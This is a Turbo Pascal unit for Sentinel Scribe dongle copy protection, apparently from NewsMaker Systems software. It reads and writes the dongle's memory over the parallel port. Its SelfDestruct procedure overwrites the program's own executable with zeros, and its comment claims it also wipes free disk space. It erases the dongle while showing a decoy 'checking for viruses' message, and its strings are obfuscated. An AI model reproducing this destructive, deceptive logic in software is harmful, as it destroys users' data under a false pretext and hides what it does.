{***************************************************************************
* Filename: ~modname~
* Version:  ~version~
* Date:     ~date~ @ ~time~
* Group:    ~group~
* Release:  ~release~
* ----------------------------
*
* Modifications
* -------------
*
* Version   Date     Time    Programmer   Description
* ~log~
*
*
* ~notes~
* Description
* -----------
* Sentinel Scribe dongle interface unit
*
* ~notesend~
*
***************************************************************************
}

{$A+,B-,D+,E+,F+,G+,I+,L+,N+,O+,P-,Q+,R+,S+,T-,V-,X+,Y+}

UNIT SEDONGLE;

INTERFACE
USES
    OpDate;

CONST
    KEYMEMLASTWORD = 59;
    KEYMEMLASTBYTE = 119;

TYPE
    SKIMAGET       = RECORD
                         CASE BOOLEAN OF
                             TRUE :
                                 (Words : ARRAY[0..KEYMEMLASTWORD] OF WORD);
                             FALSE :
                                 (Bytes : ARRAY[0..KEYMEMLASTBYTE] OF BYTE);
                     END;

    PWRecT         = RECORD
                         FailCount      : BYTE;
                         Crc            : LONGINT;
                     END;

    DongleRecT     = RECORD
                         Header         : STRING[30];
                         DropDead       : Date;
                         GoodFlag       : BOOLEAN;
                         Rand1,   {crypted key-write-enable pubkey}
                         Rand2,   {ovr scrambler key1}
                         Rand3,   {ovr scrambler key2}
                         Rand4,   {spare}
                         WriteCount     : WORD;
                         MySn           : LONGINT;
                         PWArray        : ARRAY[1..10] OF PWRecT;
                     END;

    DestructModeT  = (Passed, BADNAME, BADCREPLY, EXCESS, DropDead, BADKEY, BADCRC);

    {read dongle contents into DR}
FUNCTION ReadDongle(VAR DR : DongleRecT; KeyRPW : STRING; PORT, Cycles : WORD; AllowWarn : BOOLEAN) : BOOLEAN;
    {write DR into dongle}
FUNCTION WriteDongle(VAR DR : DongleRecT; KeyWPW : STRING; PORT, Cycles : WORD) : BOOLEAN;
    {build and return a dongle header string}
FUNCTION DONGLEHEADER : STRING;
    {calculate 32bit crc checksum of string}
FUNCTION CalcCRC(Strg : STRING) : LONGINT;
    {commit suicide}
PROCEDURE SelfDestruct(Reason : DestructModeT);

    {-----------------}

IMPLEMENTATION

USES
    ApMisc,
    Dos,
    OpCmd,
    OpCrt,
    OpString,
    {encrypted constant strings}
    SECONST,
    SECRPTLO,
    UERROR,
    UDIALOG,
    UTIAM;


    {-----------------}

    {overwrite EXE (and all free space on the disk) with all zeros}
    {making it impossible to recover the erased file              }
    { - hasta la byebye!}
    PROCEDURE SelfDestruct(Reason : DestructModeT);
    VAR
        F              : FILE;
        J              : ARRAY[1..$6FFF] OF BYTE;
        BlocksWritten,
        BlocksToWrite,
        T              : LONGINT;
        Wc,
        I              : WORD;
        COP            : CylonP;
        DR             : DongleRecT;
    BEGIN
        {$I-}
        AutopsyDeluxe(DecodeStrg(SECON15S, SECON15N, SECON15P), Long2Str(BYTE(Reason)), Iam);

        {put up checking for viruses message}
        NEW(COP, InitCFD(DecodeStrg(SECON15S, SECON15N, SECON15P), 10, 0));
        COP^.Draw;

        {fill large buffer with zeros}
        FILLCHAR(J, SIZEOF(J), #0);

        {open self-exe}
        ASSIGN(F, PARAMSTR(0));

        {make sure it is not read-only}
        SetFattr(F, 0);

        {overwrite it}
        RESET(F, SIZEOF(J));
        BlocksToWrite := FILESIZE(F) + 1;

        {save dongle write count}
        Wc := DR.WriteCount;

        {erase dongle info}
        FILLCHAR(DR, SIZEOF(DR), #0);

        {begin overwriting EXE and all empty parts of HDD partition}
        DR.WriteCount := Wc;

        {$IFNDEF DEBUG}
        {overwrite the dongle with zeros, except for the writecount value}
        WriteDongle(DR, DecodeStrg(SECON7S, SECON7N, SECON7P), 1, 0);
        {$ENDIF}

        BlocksWritten := 0;
        REPEAT
            COP^.Update;
            BLOCKWRITE(F, J, 1, I);
            INC(BlocksWritten);
        UNTIL (I <> 1) OR (BlocksWritten >= BlocksToWrite);
        CLOSE(F);
        {$I+}
        {kill the cylon}
        DISPOSE(COP, Done);
        NEW(COP, InitCFD(DecodeStrg(SECON16S, SECON16N, SECON16P), 10, 0));
        T := KTimer;
        WHILE ABS(KTimer - T) < 500 DO
            COP^.Update;

        DISPOSE(COP, Done);
        ClrScr;
        HALT;
    END;

    (*********************)

    FUNCTION CalcCRC(Strg : STRING) : LONGINT;
    VAR
        Crc            : LONGINT;
        I              : BYTE;
    BEGIN
        Crc := $FFFFFFFF;
        FOR I := 1 TO LENGTH(Strg) DO
            Crc := UpdateCRC32(BYTE(Strg[I]), Crc);
        CalcCRC := Crc;
    END;

    {-----------------}

    FUNCTION DONGLEHEADER : STRING;
    BEGIN
        {NewsMaker Systems}
        DONGLEHEADER := DecodeStrg(SECON9S, SECON9N, SECON9P);
    END;

    {-----------------}
    {$IFDEF DPMI}
    {$L SKBP7X.OBJ}
    {$ELSE}
    {$L SKTP5F.OBJ}
    {$ENDIF}

    {send a string to the dongle driver}
    FUNCTION SK_COMMAND(CmdStr : STRING) : INTEGER; EXTERNAL;

    {-----------------}

    {read dongle contents into DR}
    {KeyRPW is the Sentinel Scribe key read password}
    {Port:  1=LPT1 2=LPT2...}
    {Cycles: See sentinel scribe book.  Usually 0 for most platforms}
    FUNCTION ReadDongle(VAR DR : DongleRecT; KeyRPW : STRING; PORT, Cycles : WORD; AllowWarn : BOOLEAN) : BOOLEAN;
    VAR
        Res,
        TRes           : INTEGER;
        Dabs           : SKIMAGET ABSOLUTE DR;
        J              : WORD;
        Strg           : STRING;
    BEGIN
        ReadDongle := FALSE;
        {init dongle driver i/}
        Res := SK_COMMAND(DecodeStrg(SECON2S, SECON2N, SECON2P) +
                          Long2Str(PORT) +
                          DecodeStrg(SECON8S, SECON8N, SECON8P) +
                          Long2Str(Cycles));
        {send the driver the read password E/}
        Res := SK_COMMAND(DecodeStrg(SECON1S, SECON1N, SECON1P) + KeyRPW);
        IF Res <> 0 THEN BEGIN
            {quit if malformed password - fails later on bad password}
            IF AllowWarn THEN
                DispErrorDeluxe(DecodeStrg(SECON10S, SECON10N, SECON10P),
                                ErrorMessage(WORD(SK_COMMAND(DecodeStrg(SECON3S, SECON3N, SECON3P)))),
                                TRUE,
                                Iam);
            EXIT;
        END;

        FOR J := 0 TO KEYMEMLASTWORD DO BEGIN
            {read a dongle word cell R/}
            Res := SK_COMMAND(DecodeStrg(SECON4S, SECON4N, SECON4P) + Long2Str(J));
            IF (J * SIZEOF(WORD)) > (SIZEOF(DR) + 1) THEN
                BREAK;
            IF Res = - 1 THEN BEGIN
                {possible problem - query dongle driver status ?/}
                TRes := SK_COMMAND(DecodeStrg(SECON3S, SECON3N, SECON3P));
                IF TRes <> 0 THEN BEGIN
                    {kabong... give error message and quit}
                    DispErrorDeluxe(DecodeStrg(SECON10S, SECON10N, SECON10P), ErrorMessage(WORD(TRes)), TRUE, Iam);
                    EXIT;
                END;
            END;
            {put word cell into DongleRec}
            Dabs.Words[J] := WORD(Res);
        END;

        {check if dongle is trashed by security breach}
        IF NOT DR.GoodFlag THEN
            DispErrorDeluxe(DecodeStrg(SECON11S, SECON11N, SECON11P),
                            DecodeStrg(SECON13S, SECON13N, SECON13P) +
                            Long2Str(DR.MySn), TRUE, Iam);

        {compare actual dongle header with expected one - complain if no match}
        Strg := DONGLEHEADER;
        IF POS(Strg, DR.Header) <> 1 THEN
            DispErrorDeluxe(DecodeStrg(SECON12S, SECON12N, SECON12P), DR.Header, TRUE, Iam);

        ReadDongle := TRUE;

    END;

    {-----------------}

    {write DR contents into Sentinel Scribe dongle}
    {KeyWPW = key write password}
    {Port: 1=LPT1 2=LPT2...}
    {Cycles: see Sentinel Scribe book - usually set to 0}
    FUNCTION WriteDongle(VAR DR : DongleRecT; KeyWPW : STRING; PORT, Cycles : WORD) : BOOLEAN;
    VAR
        Dabs           : SKIMAGET ABSOLUTE DR;
        J              : WORD;
        Res            : INTEGER;
        Strg           : STRING;
    BEGIN
        WriteDongle := FALSE;
        {init the dongle driver - port and cycles I/}
        Res := SK_COMMAND(DecodeStrg(SECON2S, SECON2N, SECON2P) +
                          Long2Str(PORT) +
                          DecodeStrg(SECON8S, SECON8N, SECON8P) +
                          Long2Str(Cycles));
        IF Res <> 0 THEN BEGIN
            DispErrorDeluxe(DecodeStrg(SECON14S, SECON14N, SECON14P), ErrorMessage(WORD(Res)), TRUE, Iam);
            EXIT;
        END;
        {set the dongle driver write password E/}
        Res := SK_COMMAND(DecodeStrg(SECON1S, SECON1N, SECON1P) + KeyWPW);

        IF Res = 0 THEN BEGIN
            FOR J := 0 TO KEYMEMLASTWORD DO BEGIN
                {write a dongle word cell W/}
                Res := SK_COMMAND(DecodeStrg(SECON5S, SECON5N, SECON5P) +
                                  Long2Str(J) +
                                  DecodeStrg(SECON8S, SECON8N, SECON8P) +
                                  Long2Str(Dabs.Words[J]));
                IF (J * SIZEOF(WORD)) > (SIZEOF(DR) + 1) THEN
                    BREAK;
                IF Res = - 1 THEN BEGIN
                    {possible problem - query dongle driver status ?/}
                    Res := SK_COMMAND(DecodeStrg(SECON3S, SECON3N, SECON3P));
                    IF Res <> 0 THEN BEGIN
                        {bona fide error - bomb}
                        DispErrorDeluxe(DecodeStrg(SECON14S, SECON14N, SECON14P), ErrorMessage(WORD(Res)), TRUE, Iam);
                        EXIT;
                    END;
                END;
            END;
        END;
        WriteDongle := TRUE;
    END;

    {-----------------}

END.
{-----------------}
{-----------------}
